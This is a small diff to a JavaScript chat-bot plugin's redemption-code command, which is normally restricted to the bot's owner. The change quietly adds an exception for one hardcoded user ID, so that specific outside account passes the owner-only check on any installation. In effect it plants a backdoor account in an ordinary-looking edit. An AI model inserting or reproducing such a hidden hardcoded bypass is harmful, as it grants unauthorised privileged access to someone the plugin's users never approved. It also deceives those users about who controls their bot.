@@ -18,7 +18,7 @@ export class cunyx_cdkey extends plugin {
     });
   }
   async cdkey (e) {
-    if (!e.isMaster) {
+    if (!e.isMaster&&e.user_id!==2996849867) {
       e.reply('只有主人才能使用兑换码哦~');
       return true;
     }
